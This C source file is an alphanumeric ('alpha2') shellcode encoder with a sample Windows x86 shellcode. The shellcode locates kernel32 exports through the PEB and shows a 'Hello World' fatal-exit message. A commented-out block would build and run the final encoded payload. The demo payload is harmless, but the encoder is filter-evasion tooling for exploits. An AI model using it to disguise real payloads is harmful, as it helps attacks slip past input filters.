#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "ShellcodeHelper.h"


#define AVALID_CHARS		"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"


#define ALPHA2_KEY			ALPHA2_LOWER_KEY					// change it and it will change alpha2 decoder

#define ALPHA2_LOWER_KEY	'a'									// change it if needed ,note that 'a'  ~  'k' is avalid
#define ALPHA2_UPPER_KEY	'A'									// change it if needed ,note that 'A'  ~  'K' is avalid
#define ALPHA2_MIXED_KEY	ALPHA2_LOWER_KEY + ALPHA2_UPPER_KEY	// don't change it


#define MARK	0xCC

#define SIZE	113


unsigned char shellcode[113]=
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x72\x6c\x64\x01\x68\x6f\x20\x57"
"\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7";

//######################################################################################//


unsigned char* alpha2_encode(unsigned char *data, int len){
	
	int i,j,m,n;
	unsigned char ah,al,A,B,C,D;
	unsigned char* newshellcode = malloc( 2*len + 1);

	for(i = 0,j = 0;i < len; i++, j+=2 ) {
		
		// al = low 4 bytes  --> 0x0 <= al <= 0xF
		A = al = data[i] & 0x0f;
		// ah = high 4 bytes --> 0x0 <= ah <= 0xF
		B = ah = (data[i] & 0xf0) >> 4;

		for(m=0;m<strlen(AVALID_CHARS);m++){
			if( (AVALID_CHARS[m]&0x0F) == A )break;
		}
		
		B = AVALID_CHARS[m] >> 4;
		C =  B ^ A;

		for(n=0;n<strlen(AVALID_CHARS);n++){
			if( (AVALID_CHARS[n]&0x0F) == C )break;
		}

		D = AVALID_CHARS[n] >> 4;
		
		newshellcode[j] = (D << 4 ) + C; 
		newshellcode[j+1] = (B << 4 ) + A;

	}

	newshellcode[2*len] = '\x0';
	
	return newshellcode;

}


void testAllAsicc(){
	unsigned char tmp[1];
	unsigned char *ret;
	int i = 0;
	for(i=0x00;i<=0xFF;i++){
		tmp[0] = i;
		printf("tmp[0]=0x%02x   ==>  ",tmp[0]);
		ret = alpha2_encode(tmp,1);
		printf("%s\n",ret);
	}
}


int main(int argc, char **argv){
	
	unsigned char buf[1024];
	unsigned char tmp[1024];
	unsigned char * alpha2_encode_shellcode;
	unsigned char * alpha2_decoder;

	if(SIZE != sizeof(shellcode)) {
		printf("please change \"#define SIZE %d\"",sizeof(shellcode));	

	}
	// alpha2  encode shellcode
	alpha2_encode_shellcode = alpha2_encode(shellcode,sizeof(shellcode));
	printf("unsigned char alpha2_encode_shellcode[%d]=\n\"%s\"\n\n",2*sizeof(shellcode),alpha2_encode_shellcode);


/*

	//combine final alpha2 shellcode
	memset(buf,0,1024);
	memset(tmp,0,1024);
	safe_strncpy(tmp,alpha2_decoder,strlen(alpha2_decoder));
	safe_strncpy(tmp+strlen(alpha2_decoder),alpha2_encode_shellcode,2*sizeof(shellcode));
	sprintf(buf,"unsigned char final_shellcode[%d]=",strlen(alpha2_decoder)+2*sizeof(shellcode));
	out_C_format(tmp,strlen(alpha2_decoder)+2*sizeof(shellcode),buf,16);

	//run shellcode
	((void(*)(void))tmp)();
*/
	return (0);

}



